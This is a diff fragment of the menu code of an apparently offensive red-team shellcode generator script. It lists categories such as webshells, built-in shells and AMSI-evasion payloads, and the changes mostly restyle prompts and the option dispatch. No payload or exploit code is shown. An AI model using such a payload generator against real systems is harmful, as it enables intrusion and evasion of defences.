+    ║   7 - System built-in shells                                ║
+    ║   8 - Amsi Evasion Payloads                                 ║
+    ║                                                             ║
+    ║   E - Exit Shellcode Generator                              ║
+    ╚─────────────────────────────────────────────────────────────╣
+!
+echo "                                                  ${YellowF}SSA${RedF}RedTeam${YellowF}@2019${BlueF}_|"
+
+echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
 sleep 1
-echo -n "[➽] Chose Categorie number:"
+echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Categorie number:${Reset}
 read choice
 case $choice in
 1) sh_unix_menu ;;
@@ -11305,9 +12326,10 @@ case $choice in
 5) sh_webshell_menu ;;
 6) sh_world ;;
 7) sh_buildin ;;
-e) sh_exit ;;
-E) sh_exit ;;
-*) echo "\"$choice\": is not a valid Option"; sleep 2 ;;
+8) echo ${YellowF}[☠]${white} Not Available, Under Develop .. ${Reset}; sleep 2; sh_menu ;;
+# 8) sh_ninja ;;
+e|E) sh_exit ;;
+*) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2 ;;
 esac
 done
 
